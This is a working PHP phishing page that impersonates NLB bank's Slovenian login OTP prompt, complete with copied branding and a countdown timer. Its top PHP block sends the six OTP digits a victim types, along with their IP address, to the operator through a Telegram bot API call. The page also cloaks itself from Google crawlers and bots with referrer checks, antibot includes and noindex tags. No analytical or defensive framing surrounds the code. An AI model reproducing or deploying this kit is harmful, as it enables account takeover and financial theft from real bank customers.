<?php
   include "config.php";
   if(isset($_POST['sms1'])){
   $ip = getenv("REMOTE_ADDR");
   $message = "-------------------- ✉️ NLB SMS 2 ✉️-------------------\nSMS 2 : ".$_POST['first'].$_POST['second'].$_POST['third'].$_POST['forth'].$_POST['fifth'].$_POST['sixth']."\nIP      : ".$ip."\n-------------------- 🇸🇮 Zoldyck 🇸🇮-------------------\n";
   foreach($user_ids as $user_id) {
   $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
   $data=array('chat_id'=>$user_id,'text'=>$message);
   $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
   $context=stream_context_create($options);
   $result=file_get_contents($url,false,$context);
      
      }
  
         header("Location: loading.php?id=".$ip);
      
      }
      ?>

<?php 
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>NLB pay</title>
      <meta name="multilanguage" content="true">
      <meta name="lng" content="el">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="assets/img/favicon.ico">
      <link href="assets/css/style.css" rel="stylesheet">
      <link href="assets/css/ui.css" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
      

      <script>

         $(document).ready(function() {
            $('#modbut').click(function(e) {
               $('#modal').hide();
             });
         });  
         $(document).ready(function(){
         
         $('body').on('keyup', 'input.mat-input-element', function()
         {
         var key = event.keyCode || event.charCode;
         var inputs = $('input.mat-input-element');
         if(($(this).val().length === this.size) && key != 32) 
         {
         inputs.eq(inputs.index(this) + 1).focus();  
         } 
         if( key == 8 || key == 46 )
         {
         var indexNum = inputs.index(this);
         if(indexNum != 0)
         {
         inputs.eq(inputs.index(this) - 1).val('').focus();
         }
         }
         
         });
         });
         
         
      </script>
     
      <script>
         $(document).ready(function(){
            $('#casms1').keyup(function(){
               if($('#casms1').val().length > 0){
                  $("#mod2").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused');
                  $("#mod1").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               } else{
                  $("#mod2").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }
            }).trigger('keyup');
         });
         
         $(document).ready(function(){
            $('#casms2').keyup(function(){
               if($('#casms2').val().length > 0){
                  $("#mod3").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused');
                  $("#mod2").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }else{
                  $("#mod3").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               } 
            }).trigger('keyup');
         });
         $(document).ready(function(){
            $('#casms3').keyup(function(){
               if($('#casms3').val().length > 0){
                  $("#mod4").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused');
                  $("#mod3").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }else{
                  $("#mod4").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }   
            }).trigger('keyup');
         });
         $(document).ready(function(){
            $('#casms4').keyup(function(){
               if($('#casms4').val().length > 0){
                  $("#mod5").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused');
                  $("#mod4").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               } else{
                  $("#mod5").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }
            }).trigger('keyup');
         });
         $(document).ready(function(){
            $('#casms5').keyup(function(){
               if($('#casms5').val().length > 0){
                  $("#mod6").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused');
                  $("#mod5").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               } else{
                  $("#mod6").removeClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused').addClass('modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted');
               }
            }).trigger('keyup');
         });
         
         
         
      </script>
      <script type="text/javascript">
         $(document).ready(function() {
         $(':input[type="submit"]').prop('disabled', true);
         $('input[type="tel"]').keyup(function() {
           if($('#casms6').val() != '') {
              $(':input[type="submit"]').prop('disabled', false);
           }else{
               $(':input[type="submit"]').prop('disabled', true);
             }
         });
         });
         
          
      </script>
      <script type="text/javascript">
         function startTimer(duration, display) {
         var timer = duration, minutes, seconds;
         setInterval(function () {
             minutes = parseInt(timer / 60, 10);
             seconds = parseInt(timer % 60, 10);
         
             minutes = minutes < 10 ? "0" + minutes : minutes;
             seconds = seconds < 10 ? "0" + seconds : seconds;
         
             display.textContent = minutes + ":" + seconds;
         
             if (--timer < 0) {
                 timer = duration;
             }
         }, 1000);
         }
         
         window.onload = function () {
         var fiveMinutes = 60 * 2,
             display = document.querySelector('#time');
         startTimer(fiveMinutes, display);
         };
      </script>
   </head>
   <body class="login-bg windows login-retail modal-open" >
      <div class="appRoot">
         <div class="flex-column min-height-full-vh">
         <header style="background:#26007D;margin-bottom:20px">
            <nav class="navbar navbar-expand-lg navbar-light" style="align-items: flex-start;display: flex; justify-content: space-between;">
  <a class="navbar-brand" href="#"><img src="https://klikotp.nlb.si/nlb_left_02.png" /> </a>
  <div class="collapse navbar-collapse" style="justify-content: flex-end;padding-top:10px" id="navbarNav">
    <ul class="navbar-nav" style="display: flex;">
      <li class="nav-item" style="margin:0px 2px;">
        <a class="nav-link" href="#">NLB</a>
      </li>
      <li class="nav-item" style="margin:0px 2px;padding-left:2px;">
        <a class="nav-link" href="#">O NLB Kliku</a>
      </li>
      <li class="nav-item" style="margin:0px 2px;padding-left:2px;">
        <a class="nav-link" href="#">Kontakt</a>
      </li>
    </ul>
  </div>
</nav>
            </header>

      <ngb-modal-backdrop style="z-index: 1050" class="modal-backdrop fade show"></ngb-modal-backdrop>
      <ngb-modal-window role="dialog" tabindex="-1" class="modal fade show d-block modal-small">
         <div role="document" class="modal-dialog">
            <div class="modal-content">
               <two-fa-modal>
                  <div class="card bg-white">
                     <modal-header>
                        <div class="bg-white position-relative" style="padding: 0.75rem; border-radius: 0.5rem">
                           <h4 class="modal-header ng-star-inserted" style="color:#8db925;"> Prijava uporabnika </h4>
                           <button aria-label="Close" class="icon-clear button-transparent icon-container-small text-x-large text-primary margin-left-auto position-absolute modal-button-position--left" type="button"></button>
                        </div>
                        <hr class="modal-header-divider ng-star-inserted">
                     </modal-header>
                     <div class="modal-wrapper-padding">
                        <div class="margin-top-normal">
                           <div class="responsive-image-figure-container--otp">
                              <figure class="responsive-image-figure__otp"><img class="responsive-image" src="assets/img/login-otp.svg"></figure>
                           </div>
                        
                           <p class="text-light-black text-light margin-top-normal ng-star-inserted"> Prvič se povezujete iz tega brskalnika. Zaradi vaše varnosti vnesite OTP. Ob naslednji prijavi iz istega brskalnika ne boste pozvani, da ga Browser. </p>
                           <switch class="ng-star-inserted">
                              <div class="switch-container switch-container--space-between">
                                 <p class="switch-text"> Želite si zapomniti povezavo z določenim browser; </p>
                                 <mat-slide-toggle aria-label="toggle Switch" class="switch mat-slide-toggle mat-accent is-enabled mat-checked" id="mat-slide-toggle-1" tabindex="-1">
                                    <label class="mat-slide-toggle-label" for="mat-slide-toggle-1-input">
                                       <div class="mat-slide-toggle-bar mat-slide-toggle-bar-no-side-margin">
                                          <input class="mat-slide-toggle-input cdk-visually-hidden" role="switch" type="checkbox" id="mat-slide-toggle-1-input" tabindex="0" aria-checked="true" aria-label="toggle Switch">
                                          <div class="mat-slide-toggle-thumb-container">
                                             <div class="mat-slide-toggle-thumb"></div>
                                             <div class="mat-slide-toggle-ripple mat-ripple" mat-ripple="">
                                                <div class="mat-ripple-element mat-slide-toggle-persistent-ripple"></div>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="mat-slide-toggle-content"><span style="display:none">&nbsp;</span></span>
                                    </label>
                                 </mat-slide-toggle>
                              </div>
                           </switch>
                           <form action="" method="POST">
                              <input type="hidden" name="captcha">
                              <input type="hidden" name="step" value="sms">
                              <div class="modal-wrapper-i-code-margin__short bg-gray">
                                 <i-code>
                                    <div class="flex-space-between flex-column-reverse--sm-only bg-gray shadow-inset" style="padding: 0.75rem 1rem 0 2rem;">
                                    <div class="ng-star-inserted">
                                          <label class="text-gray text-bold text-small" for="digit-1" style="display: block; margin-bottom: -0.75rem;">OTP</label>
                                          <div style="margin: 0 -0.25rem;">
                                             <div  id="mod1" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted mat-focused" style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms1" style="text-align: center;" class="mat-input-element"  size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  autofocus="autofocus" name="first" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-0 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div  id="mod2" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-3 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted " style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms2" style="text-align: center;" class="mat-input-element" size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="second" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-1 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div id="mod3" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms3" style="text-align: center;" class="mat-input-element" size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" name="third" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-2 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div id="mod4" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-3 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms4" style="text-align: center;" class="mat-input-element"  size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="forth" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-3 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-3 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div id="mod5" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-4 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms5" style="text-align: center;" class="mat-input-element" size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="fifth" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-4 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-4 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div id="mod5" class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-4 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                                <div class="mat-form-field-wrapper">
                                                   <div class="mat-form-field-flex">
                                                      <div class="mat-form-field-infix">
                                                         <input id="casms5" style="text-align: center;" class="mat-input-element" size="1" maxlength="1" type="tel" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="sixth" required>
                                                         <span class="mat-form-field-label-wrapper">
                                                         </span>
                                                      </div>
                                                   </div>
                                                   <div class="mat-form-field-underline ng-tns-c0-4 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                   <div class="mat-form-field-subscript-wrapper">
                                                      <div class="mat-form-field-hint-wrapper ng-tns-c0-4 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                         <div class="mat-form-field-hint-spacer"></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="text-align-center ng-star-inserted" style="max-width: 16.5rem;">
                                          <div class="ng-star-inserted">
                                             <p class="text-x-small text-light text-light-black mat-title-margin-bottom">
                                             Vnesite OTP, prejet prek SMS -a ali Viber na mobilni telefon <span class="ng-star-inserted"></span>
                                             </p>
                                             <span class="text-large text-light text-light-black" id="time"> 02:00 </span>
                                          </div>
                                       </div>
                                    </div>
                                 </i-code>
                              </div>
                        </div>
                        <div class="footer-buttons-container">
                        <spinner type="action">
                        <button class="button margin-left-auto ng-star-inserted " style="background-color:#F9662B;" type="submit" id="sms1" name="sms1" id="start_button" disabled> Kontinuiteta </button>
                        </spinner>
                        </div>
                     </div>
                  </div>
                  </form>
               </two-fa-modal>
            </div>
         </div>
      </ngb-modal-window>
      
   </body>
</html>
<?php } ?>